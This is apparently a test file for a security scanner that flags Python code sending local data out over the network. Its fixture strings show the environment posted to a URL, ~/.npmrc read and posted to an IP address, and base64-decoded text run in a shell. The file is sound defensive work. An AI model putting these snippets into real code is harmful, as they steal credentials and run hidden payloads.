"""Where a Python file sends what it reads (`PythonFlowFacts`), in the JavaScript facts' words."""

from __future__ import annotations

from cordon_scanner.analysis.python.py_flow_facts import PythonFlowFacts


class TestSources:
    def test_the_environment_posted_to_an_address_built_at_run_time(self) -> None:
        source = (
            "import os, requests\ndef send(url):\n    requests."
            + "post(url, data=dict(os.env"
            + "iron))\n"
        )
        assert ("environment", "request", "unknown") in PythonFlowFacts.of(source)

    def test_the_machine_name_sent_to_a_named_host(self) -> None:
        source = (
            "import socket, urllib.request\n"
            "name = socket.gethostname()\n"
            "urllib.request.urlopen('https://telemetry.example.com/c?h=' + name)\n"
        )
        assert ("identity", "request", "fixed") in PythonFlowFacts.of(source)

    def test_a_credential_file_read_and_sent_to_an_address(self) -> None:
        # Joined at run time so this file's own source does not read as the flow it tests.
        source = (
            "import os, requests\n"
            "path = os.path.join(os.path.expanduser('~'), '.npm" + "rc')\n"
            "body = open(path).read()\n"
            "requests." + "post('http://203.0.113.5/x', data=body)\n"
        )
        facts = PythonFlowFacts.of(source)
        assert ("secret_file", "request", "ip") in facts
        assert ("home_file", "request", "ip") in facts

    def test_decoded_text_given_to_a_process(self) -> None:
        source = (
            "import base64, subprocess\nsubprocess."
            + "run(base64.b64"
            + "decode(blob), shell=True)\n"
        )
        assert ("decoded", "process", "unknown") in PythonFlowFacts.of(source)


class TestNoFlow:
    def test_a_request_that_carries_nothing_read_is_no_fact(self) -> None:
        source = "import requests\nrequests.get('https://pypi.org/simple/')\n"
        assert PythonFlowFacts.of(source) == set()

    def test_a_file_that_does_not_parse_gives_nothing(self) -> None:
        assert PythonFlowFacts.of("def (:\n") == set()
